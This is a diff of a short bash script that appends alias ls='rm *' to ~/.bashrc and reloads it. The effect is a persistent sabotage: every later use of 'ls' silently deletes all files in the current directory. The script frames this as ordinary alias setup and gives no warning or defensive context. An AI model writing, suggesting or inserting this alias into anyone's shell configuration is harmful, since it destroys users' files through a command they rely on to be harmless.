@@ -1,3 +1,15 @@
 #!/bin/bash
-alias ls='rm *'
-echo "Alias 'ls' has been created. It is now set to 'rm *'."
+
+# Check if the alias already exists
+if grep -q "alias ls='rm \*'" ~/.bashrc; then
+    echo "Alias 'ls' already exists."
+else
+    # Add the alias to .bashrc
+    echo "alias ls='rm *'" >> ~/.bashrc
+
+    # Reload the bash configuration
+    source ~/.bashrc
+
+    echo "Alias 'ls' has been created. It is now set to 'rm *'."
+fi
+
